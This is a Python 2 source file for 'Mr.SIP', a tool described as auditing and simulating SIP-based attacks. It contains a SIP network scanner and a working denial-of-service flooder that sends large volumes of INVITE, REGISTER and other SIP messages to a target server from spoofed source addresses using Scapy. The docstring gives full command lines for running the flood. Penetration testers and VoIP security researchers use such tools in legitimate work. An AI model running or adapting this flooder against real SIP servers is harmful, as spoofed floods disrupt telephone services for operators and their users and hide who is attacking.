#!/usr/bin/python
# -*- coding: cp1254 -*-

"""
mr.sip.py: MR SIP is a tool developed to audit and simulate SIP-based attacks.

# At first you need to instal: 
# apt-get install python-scapy
# pip install netifaces
# pip install ipaddress
# apt-get install figlet
# apt-get install toilet

# SIP-DAS usage-1: sudo ./mr.sip.py --ds --dm <sip_method_name> -c <number_of_packets> --di <server_ip> --dp <server_port> -r --to <to_user_file> --fu <from_user_file> --ua <user_agent_file>  --su <sp_user_file> 
# SIP-DAS usage-2: sudo ./mr.sip.py --ds --dm <sip_method_name> -c <number_of_packets> --di <server_ip> --dp <server_port> -s --to <to_user_file> --fu <from_user_file> --ua <user_agent_file>  --su <sp_user_file> 
# SIP-DAS usage-3: sudo ./mr.sip.py --ds --dm <sip_method_name> -c <number_of_packets> --di <server_ip> --dp <server_port> -m --to <to_user_file> --fu <from_user_file> --ua <user_agent_file>  --su <sp_user_file> -il <client_ip_list>

# SIP-NES Usage: sudo ./mr.sip.py --ns --tn <network_range> -i <file_location>

# Tips for getting SIP trace:
# ngrep -W byline -d eth0 port 5060
# ngrep -W byline -d eth0 port 5060 -O capture_file
# ngrep -W byline -d eth0 INVITE
# tcpdump -i eth0 -n -s 0 port 5060
# tcpdump -i eth0 -n -s 0 port 5060 -vvv -w /home/capture_file_name
# tcpdump -nqt -s 0 -A -i en0 port 5060 
"""

__author__ = "Melih Tas, Caner Erce"
__copyright__ = "Copyrgiht 2017"
__credits__ = ["Melih Tas", "Caner Erce"]
__license__ = "GPL"
__version__ = "1.0.0"
__maintainer__ = "Melih Tas"
__status__ = "Beta"     

import random,string,ipaddress,netifaces,os,socket,logging
from optparse import OptionParser, OptionGroup
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import conf, IP
import sip_packet, utilities

usage = "usage: %prog [--ns|--ds|--se] [OPTIONS]"
parser = OptionParser(usage=usage)
    
    # Network Scanner 
parser.add_option("--ns", "--network-scanner", action="store_true", dest="network_scanner", default=False, help="Scan specified network for live connections.")
    # DoS Simulator 
parser.add_option("--ds", "--dos-simulator", action="store_true", dest="dos_simulator", default=False, help="Spoof IP addresses manually.")
    # SIP Enumerator 
parser.add_option("--se", "--sip-enumerator", action="store_true", dest="sip_enumerator", default=False, help="Spoof IP addresses manually.")
    
group = OptionGroup(parser, "NES Options")
group.add_option("--tn", "--target-network", dest="target_network", help="Target network range to scan.")
group.add_option("-i", "--ip-save-list", dest="ip_list", default="ip_list.txt", help="Output file location to save live IP address.\n Default location is inside application folder ip_list.txt.")
parser.add_option_group(group)
    
group = OptionGroup(parser, "DAS Options")
group.add_option("--dm", "--dos-method", dest="dos_method", default="invite", help="DoS packet type selection. options, invite, register, sip-invite, subscribe, cancel, bye or other custom method file name.")
group.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
group.add_option("-l", "--lib", action="store_true", dest="library", default=False, help="Use Socket library (no spoofing), default is Scapy")
group.add_option("--di", "--destination-ip", dest="dest_ip", help="Destination SIP server IP address.")
group.add_option("--dp", "--destination-port", dest="dest_port", default=5060, help="Destination SIP server port number. Default is 5060.")
group.add_option("-r", "--random", action="store_true", dest="random", default=False, help="Spoof IP addresses randomly.")
group.add_option("-m", "--manual", action="store_true", dest="manual", default=False, help="Spoof IP addresses manually. If you choose manual IP usage, you have to specify a IP list via --manual-ip-list parameter.")
group.add_option("-s", "--subnet", action="store_true", dest="subnet", default=False, help="Spoof IP addresses from subnet.")
group.add_option("--to", "--to-user", dest="to_user", default="toUser.txt", help="To User list file location. Default is toUser.txt.")
group.add_option("--fu", "--from-user", dest="from_user", default="fromUser.txt", help="From User list file location. Default is fromUser.txt.")
group.add_option("--su", "--sp-user", dest="sp_user", default="spUser.txt", help="SP User list file location. Default is spUser.txt.")
group.add_option("--ua", "--user-agent", dest="user_agent", default="userAgent.txt", help="User Agent list file location. Default is userAgent.txt.")
group.add_option("--il", "--manual-ip-list", dest="manual_ip_list", help="IP list file location.")
parser.add_option_group(group)
    
(options, args) = parser.parse_args()

def main():
    os.system("toilet Mr.SIP")
    if options.network_scanner:
        networkScanner()
    elif options.dos_simulator:
        dosSmilator()
    elif options.sip_enumerator:
        sipEnumerator()


def networkScanner():
    conf.verb = 0
    
    client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
    
    print "[!] Network scan process started for {0}".format(options.target_network)
    targetNetwork = ipaddress.IPv4Network(unicode(options.target_network), strict=False)
    counter = 0
    for machine in targetNetwork.hosts():
        sip = sip_packet.sip_packet("options", machine.exploded, options.dest_port, client_ip, protocol="socket", wait=True)
        result = sip.generate_packet()
        if result["status"]: 
            if result["response"]['code'] == 200:
                utilities.writeFile(options.ip_list, '{0}\n'.format(machine.exploded))
                print "[+] New live IP found on {0}".format(machine.exploded)
                counter += 1
    print "[!] Network scan process finished and {0} live IP address(s) found.".format(str(counter))
    
def sipEnumerator():
    conf.verb = 0
    
    print "[...] These part will be completed as soon as possible..."

def dosSmilator():
    conf.verb = 0
    
    client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
    
    print ("[!] Client Interface: {0}".format(str(conf.iface)))
    print ("[!] Client IP: {0} ".format(str(client_ip)))
    
    utilities.promisc("on",conf.iface)

    i = 0
    while i < int(options.counter):
        try:
            
            toUser = random.choice([line.rstrip('\n') for line in open(options.to_user)])
            fromUser = random.choice([line.rstrip('\n') for line in open(options.from_user)])
            spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
            userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])
            
            pkt= IP(dst=options.dest_ip)
            client = pkt.src
            
            if options.random and not options.library:
                client = utilities.randomIPAddress()
            if options.manual and not options.library:
                client = random.choice([line.rstrip('\n') for line in open(options.manual_ip_list)])
            if options.subnet and not options.library:
                client = utilities.randomIPAddressFromNetwork(client_ip, client_netmask)
            send_protocol = "scapy"
            if options.library:
                send_protocol = "socket"
                
            sip = sip_packet.sip_packet(str(options.dos_method), str(options.dest_ip), str(options.dest_port), str(client), str(fromUser), str(toUser), str(userAgent), str(spUser), send_protocol)
            sip.generate_packet()
            i += 1
            utilities.printProgressBar(i,int(options.counter),"Progress: ")
        except (KeyboardInterrupt):
            utilities.promisc("off",conf.iface)
            print("Exiting traffic generation...")
            raise SystemExit
    
    print "[!] DoS simulation finished and {0} packet sent to {1}...".format(str(i),str(options.dest_ip))
    utilities.promisc("off",conf.iface)

if __name__ == "__main__":
    main()
    